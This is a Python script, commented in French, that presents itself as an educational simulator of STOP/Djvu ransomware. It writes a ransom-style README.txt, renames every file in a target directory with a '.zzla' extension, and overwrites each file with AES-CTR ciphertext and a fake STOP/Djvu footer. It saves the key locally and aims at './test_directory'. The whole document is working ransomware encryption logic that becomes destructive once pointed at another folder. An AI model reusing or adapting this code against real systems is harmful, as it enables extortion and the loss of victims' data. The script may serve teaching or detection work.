import os
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import base64

# Configuration STOP Djvu simulée
FAKE_SIGNATURE = b'djvus'
FAKE_ID = get_random_bytes(32)  # ID machine simulé (32 octets)
FAKE_KEY_ENCRYPTED = get_random_bytes(32)  # Clé AES simulée chiffrée

# Génère une clé AES pour le chiffrement
def generate_key():
    return get_random_bytes(32)

# Fonction de chiffrement AES-CTR avec footer STOP Djvu simulé
def encrypt_file_stop_djvu(file_path, key):
    with open(file_path, 'rb') as f:
        data = f.read()

    nonce = get_random_bytes(8)  # Comme STOP Djvu (CTR)
    cipher = AES.new(key, AES.MODE_CTR, nonce=nonce)
    encrypted_data = cipher.encrypt(data)

    # Construction du footer simulé STOP Djvu
    fake_footer = FAKE_SIGNATURE + FAKE_KEY_ENCRYPTED + FAKE_ID

    with open(file_path, 'wb') as f:
        f.write(nonce + encrypted_data + fake_footer)

# Renomme les fichiers avec ".zzla"
def rename_files(directory, ext=".zzla"):
    for filename in os.listdir(directory):
        path = os.path.join(directory, filename)
        if os.path.isfile(path) and filename != "README.txt":
            new_name = filename + ext
            os.rename(path, os.path.join(directory, new_name))
            print(f"[+] Renommé : {filename} -> {new_name}")

# Crée une fausse note de rançon comme dans STOP Djvu
def create_readme(directory):
    ransom_note = f"""
    ATTENTION !
    Vos fichiers ont été chiffrés avec .zzla
    Ce simulateur est à but éducatif uniquement.
    Aucune donnée n’a été compromise.
    Votre ID personnelle : {base64.b64encode(FAKE_ID).decode()[:32]}
    Pour tout renseignement, contactez : fake-decrypt-support@education.org
    """
    with open(os.path.join(directory, "README.txt"), 'w') as f:
        f.write(ransom_note.strip())

# Sauvegarde la clé dans un fichier texte
def save_key_to_file(key, path="aes_key.txt"):
    with open(path, 'w') as f:
        f.write(key.hex())
    print(f"[+] Clé AES sauvegardée dans : {path}")

# Traite tout le dossier
def encrypt_directory_stop_djvu(directory, key):
    create_readme(directory)
    rename_files(directory)

    for filename in os.listdir(directory):
        path = os.path.join(directory, filename)
        if os.path.isfile(path) and filename != "README.txt":
            encrypt_file_stop_djvu(path, key)
            print(f"[+] Fichier chiffré façon STOP Djvu : {filename}")

# Exemple d’utilisation
if __name__ == "__main__":
    test_dir = "./test_directory"
    key = generate_key()
    encrypt_directory_stop_djvu(test_dir, key)
    save_key_to_file(key)
